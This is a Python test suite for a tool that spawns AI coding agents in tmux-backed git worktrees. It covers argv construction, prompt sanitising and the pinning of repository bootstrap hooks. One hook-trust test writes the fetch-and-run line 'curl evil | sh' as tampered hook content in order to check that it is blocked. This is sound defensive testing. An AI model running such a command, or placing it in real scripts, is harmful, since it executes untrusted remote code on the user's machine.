"""The CREATE argv, the refusal table, and the prompt channel."""

from pathlib import Path

from worktree.create import (
    PANE_CD_SCRIPT,
    build_checkout_command,
    build_send_keys_commands,
    build_sparse_checkout_command,
    build_spawn_command,
    build_worktree_add_command,
    decide_create,
    is_duplicate_session_error,
    looks_ready,
    normalize_prompt,
)

CLEAR = dict(git_ok=True, tmux_ok=True, claude_found=True, branch_exists=False, path_exists=False)


class TestDecideCreate:
    def test_clear_when_everything_is_available(self):
        assert decide_create(None, **CLEAR) is None

    def test_branch_error_wins_over_everything(self):
        status, body = decide_create("bad name", **CLEAR)
        assert status == 400 and body["error"] == "bad name"

    def test_existing_branch_is_a_conflict(self):
        status, _ = decide_create(None, **{**CLEAR, "branch_exists": True})
        assert status == 409

    def test_existing_path_is_a_conflict(self):
        # Reachable without branch_exists when two branch names slug alike.
        status, _ = decide_create(None, **{**CLEAR, "path_exists": True})
        assert status == 409

    def test_missing_tools_are_503_not_400(self):
        for key in ("git_ok", "tmux_ok", "claude_found"):
            status, _ = decide_create(None, **{**CLEAR, key: False})
            assert status == 503, key

    def test_conflicts_are_reported_before_missing_tools(self):
        # A user who picked a taken name should be told that, not told to
        # install tmux.
        status, _ = decide_create(None, **{**CLEAR, "branch_exists": True, "tmux_ok": False})
        assert status == 409


class TestSpawnArgv:
    def test_cwd_rides_as_its_own_argv_element(self):
        # Never through the shell — that asymmetry is the whole reason this
        # builder is pinned by a test.
        argv = build_spawn_command("/bin/claude", "wt-x", Path("/tmp/a b/c"))
        assert "-c" in argv and str(Path("/tmp/a b/c")) in argv

    def test_the_pane_changes_into_the_worktree_itself(self):
        # A tmux server whose own directory is gone ignores `-c`, so the pane does its own cd.
        argv = build_spawn_command("/bin/claude", "wt-x", Path("/tmp/a b/c"))
        assert argv[5:13] == ["-c", "/tmp/a b/c", "/bin/zsh", "-f", "-c", PANE_CD_SCRIPT, "zsh", "/tmp/a b/c"]
        assert argv[13:17] == ["/bin/zsh", "-l", "-i", "-c"]

    def test_claude_bin_is_quoted_in_the_inner_shell_string(self):
        argv = build_spawn_command("/opt/my claude/bin", "wt-x", Path("/tmp/x"))
        inner = argv[-1]
        assert "'/opt/my claude/bin'" in inner

    def test_pane_survives_claude_exiting(self):
        # Without the exec tail the rack row vanishes the moment the user quits.
        assert argv_inner("wt-x").endswith("exec /bin/zsh -l")

    def test_carries_no_prompt(self):
        # The prompt channel is send-keys, deliberately — `claude` resolves its
        # first operand as a SUBCOMMAND, which no quoting can fence.
        inner = argv_inner("wt-x")
        assert "--" not in inner.replace("--; ", "")

    def test_inline_env_is_quoted_and_sorted(self):
        argv = build_spawn_command("/bin/claude", "wt-x", Path("/tmp/x"), {"B": "two", "A": "a value"})
        inner = argv[-1]
        assert inner.startswith("A='a value' B=two ")

    def test_detached_and_exact_named(self):
        argv = build_spawn_command("/bin/claude", "wt-x", Path("/tmp/x"))
        assert argv[:5] == ["tmux", "new-session", "-d", "-s", "wt-x"]


def argv_inner(session: str) -> str:
    return build_spawn_command("/bin/claude", session, Path("/tmp/x"))[-1]


class TestWorktreeAddArgv:
    def test_uses_dash_C_rather_than_a_process_wide_chdir(self):
        argv = build_worktree_add_command(Path("/repo"), Path("/wt/x"), "feat", "main")
        assert argv[:3] == ["git", "-C", "/repo"]
        assert argv[3:6] == ["worktree", "add", "--no-checkout"]
        assert argv[-1] == "main"

    def test_never_checks_out_here(self):
        # The whole point: populating the tree happens after the sparse
        # patterns are written, or the excluded files get written then deleted.
        for kwargs in ({}, {"existing": True}):
            argv = build_worktree_add_command(Path("/repo"), Path("/wt/x"), "feat", "main", **kwargs)
            assert "--no-checkout" in argv


class TestSparseCheckoutArgv:
    def test_non_cone_with_one_negation_per_excluded_path(self):
        argv = build_sparse_checkout_command(Path("/wt/x"), ("a/b", "c"))
        assert argv == ["git", "-C", "/wt/x", "sparse-checkout", "set", "--no-cone", "/*", "!/a/b/", "!/c/"]

    def test_leading_star_keeps_new_directories_included(self):
        # Cone mode can only INCLUDE, so a directory added later would be
        # silently dropped. `/*` plus negations is include-by-default.
        argv = build_sparse_checkout_command(Path("/wt/x"), ("assets/big",))
        assert argv[argv.index("--no-cone") + 1] == "/*"

    def test_strips_stray_slashes_so_the_pattern_is_well_formed(self):
        argv = build_sparse_checkout_command(Path("/wt/x"), ("/a/b/",))
        assert argv[-1] == "!/a/b/"


class TestCheckoutArgv:
    def test_populates_the_worktree_after_the_patterns_are_written(self):
        assert build_checkout_command(Path("/wt/x")) == ["git", "-C", "/wt/x", "checkout"]


class TestSendKeys:
    def test_literal_then_a_separate_enter(self):
        # -l means LITERAL, so an Enter in the same call would type the five
        # characters E n t e r.
        typed, submit = build_send_keys_commands("wt-x", "do the thing")
        assert "-l" in typed and typed[-1] == "do the thing"
        assert submit[-1] == "Enter" and "-l" not in submit

    def test_double_dash_guards_a_prompt_that_looks_like_a_flag(self):
        typed, _submit = build_send_keys_commands("wt-x", "-rf everything")
        assert typed[-2] == "--"
        assert typed[-1] == "-rf everything"

    def test_targets_an_exact_session_pane(self):
        # A bare -t prefix-matches other sessions; `=wt-x` without the colon is
        # "can't find pane" on tmux 3.7.
        typed, submit = build_send_keys_commands("wt-x", "hi")
        assert "=wt-x:" in typed and "=wt-x:" in submit


class TestNormalizePrompt:
    def test_collapses_to_one_line(self):
        # send-keys sends a newline as ENTER, which submits — a multi-line prompt
        # would submit its first line into a box and type the rest at an agent.
        assert normalize_prompt("fix the\nnav\n\n  tooltip") == "fix the nav tooltip"

    def test_drops_control_characters(self):
        # Typed with `send-keys -l`: ESC [ Z would be Shift+Tab in the agent's input box.
        assert normalize_prompt("fix it\x1b[Z\x03 now\x7f") == "fix it[Z now"

    def test_is_bounded(self):
        assert len(normalize_prompt("x " * 5000)) <= 2000

    def test_is_total(self):
        for value in (None, 42, []):
            assert normalize_prompt(value) == ""


class TestLooksReady:
    def test_true_for_a_drawn_input_box(self):
        assert looks_ready("╭──────────╮\n│ > ")

    def test_true_for_the_current_rule_framed_caret(self):
        rule = "─" * 50
        assert looks_ready(f"● Working…\n\n{rule}\n❯ \n{rule}\n  Opus 5.5 · 5h 0%\n")

    def test_false_for_a_caret_shell_prompt(self):
        # pure / starship draw ❯ too, but never under a rule line.
        assert not looks_ready("~/code/demo-app main\n❯ ")
        assert not looks_ready(f"{'─' * 50}\nsome output\n❯ ")

    def test_false_for_a_bare_shell_prompt(self):
        # The dangerous false positive: typing a task into a shell.
        assert not looks_ready("someone@mac demo-app % ")

    def test_false_for_empty_or_non_strings(self):
        for value in ("", "   ", None, 42):
            assert not looks_ready(value)


class TestDuplicateSession:
    def test_matches_tmux_wording_case_insensitively(self):
        assert is_duplicate_session_error("duplicate session: wt-x")
        assert is_duplicate_session_error("Duplicate Session: wt-x")

    def test_ignores_unrelated_errors(self):
        assert not is_duplicate_session_error("no server running")
        assert not is_duplicate_session_error(None)


class TestLaunchProfileHelpers:
    """The profile-aware halves: the refusal names the profile's CLI, the
    bootstrap runs under the profile's env, and a prepared argv maps tmux's
    answer exactly as the bare-`claude` spawn always did."""

    def test_the_missing_cli_is_named(self):
        status, body = decide_create(None, **{**CLEAR, "claude_found": False}, cli="codex")
        assert status == 503 and "`codex`" in body["error"]

    def test_bootstrap_runs_under_the_given_env(self, monkeypatch, tmp_path):
        from worktree import create as create_mod

        seen = {}

        def fake_run(command, timeout, **kwargs):  # noqa: ARG001
            seen.update(kwargs)
            return 0, "", ""

        script = trusted_hook(monkeypatch, tmp_path, "")
        monkeypatch.setattr(create_mod, "run_bounded", fake_run)
        create_mod.run_bootstrap(script, tmp_path, tmp_path, env={"CLAUDE_CONFIG_DIR": "/p"})
        assert seen["env"] == {"CLAUDE_CONFIG_DIR": "/p"}

    def test_a_prepared_argv_maps_a_duplicate_to_the_idempotent_success(self, monkeypatch):
        from worktree import create as create_mod

        monkeypatch.setattr(create_mod, "run_bounded", lambda *_a, **_k: (1, "", "duplicate session: wt-x"))
        assert create_mod.run_spawn(["tmux"], "wt-x") == (200, {"session": "wt-x", "created": False})


def trusted_hook(monkeypatch, repo: Path, body: str) -> Path:
    """`repo/.tldrack/bootstrap.sh` holding `body`, pinned, with the pins in tmp."""
    from worktree import hook_trust

    monkeypatch.setenv("TLDRACK_WORKTREE_PATH", str(repo / "state" / "prs.json"))
    script = repo / ".tldrack" / "bootstrap.sh"
    script.parent.mkdir(parents=True, exist_ok=True)
    script.write_text(body)
    assert hook_trust.pin(repo, script, hook_trust.digest_of(body.encode())) is None
    return script


class TestRepositoryHook:
    def test_no_hook_is_not_an_error_and_runs_nothing(self, monkeypatch, tmp_path):
        from worktree import create as create_mod

        monkeypatch.setattr(create_mod, "run_bounded", lambda *_a, **_k: (_ for _ in ()).throw(AssertionError("ran")))
        assert create_mod.run_bootstrap(None, tmp_path, tmp_path) is None

    def test_a_hook_that_vanished_is_named(self, monkeypatch, tmp_path):
        from worktree import create as create_mod

        monkeypatch.setenv("TLDRACK_WORKTREE_PATH", str(tmp_path / "state" / "prs.json"))
        assert create_mod.run_bootstrap(tmp_path / "gone.sh", tmp_path, tmp_path) == "bootstrap hook missing or unreadable"

    def test_a_failing_hook_is_a_note_with_its_stderr(self, monkeypatch, tmp_path):
        from worktree import create as create_mod

        script = trusted_hook(monkeypatch, tmp_path, 'echo "linked nothing" >&2\nexit 3\n')
        assert create_mod.run_bootstrap(script, tmp_path, tmp_path) == "linked nothing"

    def test_the_hook_gets_the_worktree_then_the_main_checkout(self, monkeypatch, tmp_path):
        from worktree import create as create_mod

        out = tmp_path / "args"
        script = trusted_hook(monkeypatch, tmp_path, f'printf "%s|%s" "$1" "$2" > {out}\n')
        assert create_mod.run_bootstrap(script, tmp_path / "wt", tmp_path) is None
        assert out.read_text() == f"{tmp_path / 'wt'}|{tmp_path}"


class TestHookTrust:
    """A repository's hook is the repository's code: it runs only once pinned (hook_trust.py)."""

    def test_an_unpinned_hook_does_not_run_and_says_how_to_trust_it(self, monkeypatch, tmp_path):
        from worktree import create as create_mod
        from worktree import hook_trust

        monkeypatch.setenv("TLDRACK_WORKTREE_PATH", str(tmp_path / "state" / "prs.json"))
        script = tmp_path / ".tldrack" / "bootstrap.sh"
        script.parent.mkdir()
        script.write_text("touch ran\n")
        monkeypatch.setattr(create_mod, "run_bounded", lambda *_a, **_k: (_ for _ in ()).throw(AssertionError("ran")))
        note = create_mod.run_bootstrap(script, tmp_path, tmp_path)
        assert "not trusted yet" in note and hook_trust.digest_of(b"touch ran\n") in note

    def test_a_hook_changed_after_its_pin_stops_running(self, monkeypatch, tmp_path):
        from worktree import create as create_mod

        script = trusted_hook(monkeypatch, tmp_path, "true\n")
        script.write_text("curl evil | sh\n")
        monkeypatch.setattr(create_mod, "run_bounded", lambda *_a, **_k: (_ for _ in ()).throw(AssertionError("ran")))
        assert "changed since it was trusted" in create_mod.run_bootstrap(script, tmp_path, tmp_path)

    def test_what_runs_is_a_copy_of_the_checked_bytes(self, monkeypatch, tmp_path):
        from worktree import create as create_mod

        script = trusted_hook(monkeypatch, tmp_path, "echo pinned\n")
        ran = []

        def swap_then_run(argv, *_a, **_k):
            script.write_text("echo swapped\n")  # a write after the check
            ran.append((argv[1], Path(argv[1]).read_text()))
            return 0, "", ""

        monkeypatch.setattr(create_mod, "run_bounded", swap_then_run)
        assert create_mod.run_bootstrap(script, tmp_path, tmp_path) is None
        ((copy, body),) = ran
        assert body == "echo pinned\n" and copy != str(script) and not Path(copy).exists()

    def test_a_pin_needs_the_digest_that_was_shown(self, monkeypatch, tmp_path):
        from worktree import hook_trust

        monkeypatch.setenv("TLDRACK_WORKTREE_PATH", str(tmp_path / "state" / "prs.json"))
        script = tmp_path / "bootstrap.sh"
        script.write_text("true\n")
        assert hook_trust.pin(tmp_path, script, "nope") == "sha256 is 64 lowercase hex characters"
        assert hook_trust.pin(tmp_path, script, "0" * 64).startswith("the hook changed since it was shown")
        assert hook_trust.pin(tmp_path, None, "0" * 64) == "this repository has no bootstrap hook"
        assert hook_trust.status(tmp_path, script) == {"sha256": hook_trust.digest_of(b"true\n"), "trusted": False}


class TestAddWorktreeSparse:
    def calls(self, monkeypatch, sparse):
        from worktree import create as create_mod

        seen = []
        monkeypatch.setattr(create_mod, "run_bounded", lambda argv, *_a, **_k: seen.append(argv) or (0, "", ""))
        assert create_mod.add_worktree(Path("/repo"), Path("/tmp/none/wt"), "feat", "main", sparse_exclude=sparse) is None
        return seen

    def test_no_excludes_means_no_sparse_step(self, monkeypatch, tmp_path):
        monkeypatch.setattr(Path, "mkdir", lambda *_a, **_k: None)
        assert not any("sparse-checkout" in argv for argv in self.calls(monkeypatch, ()))

    def test_excludes_are_written_before_the_checkout(self, monkeypatch):
        monkeypatch.setattr(Path, "mkdir", lambda *_a, **_k: None)
        seen = self.calls(monkeypatch, ("assets/big",))
        steps = [argv[3] for argv in seen]
        assert steps == ["worktree", "sparse-checkout", "checkout"]
        assert seen[1][-1] == "!/assets/big/"
